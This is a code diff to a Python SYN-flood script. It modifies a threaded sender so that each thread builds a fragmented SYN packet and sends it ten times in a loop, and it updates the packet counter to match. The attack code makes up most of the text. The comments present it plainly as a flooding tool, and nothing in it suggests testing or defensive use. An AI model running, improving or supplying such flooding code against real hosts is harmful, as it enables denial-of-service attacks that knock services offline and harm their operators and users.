@@ -42,13 +42,15 @@ class sendSYN(threading.Thread):
 		#Here comes the SYN flood mechanic part, yes, that easy
 		#Only make sure you don't respond with another script!
 		tcp.flags = 'S'
-
-		#The actual packet
-		packet=ip/tcp/payload
-		#And finally the fagmentation and sending the fragments part
-		frags=fragment(packet,fragsize=fragSize)
-		for fragments in frags:
-			send(fragments,verbose=0)
+		
+		#Reuse the socket a couple of times
+		for x in range(10):
+			#The actual packet
+			packet=ip/tcp/payload
+			#And finally the fagmentation and sending the fragments part
+			frags=fragment(packet,fragsize=fragSize)
+			for fragments in frags:
+				send(fragments,verbose=0)
 
 
 if __name__ == "__main__":
@@ -69,7 +71,7 @@ if __name__ == "__main__":
 		while True:
 			if threading.activeCount() < threadLimit:
 				sendSYN().start()
-				total+=1
+				total+=10
 				sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
 
 	start()
